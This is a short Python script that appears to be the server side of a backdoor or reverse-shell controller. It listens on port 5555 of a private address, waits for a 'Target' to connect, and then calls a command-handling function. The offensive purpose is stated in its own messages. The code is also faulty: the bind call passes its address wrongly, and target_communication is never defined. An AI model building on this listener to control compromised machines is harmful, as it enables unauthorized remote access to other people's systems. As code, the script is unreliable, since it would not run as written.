import socket


sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind(('192.168.101.76'),5555)
print('[+]Listening to connections ...')
sock.listen(5)
target, ip = sock.accept()
print('Target connected'+ str(ip))

target_communication()
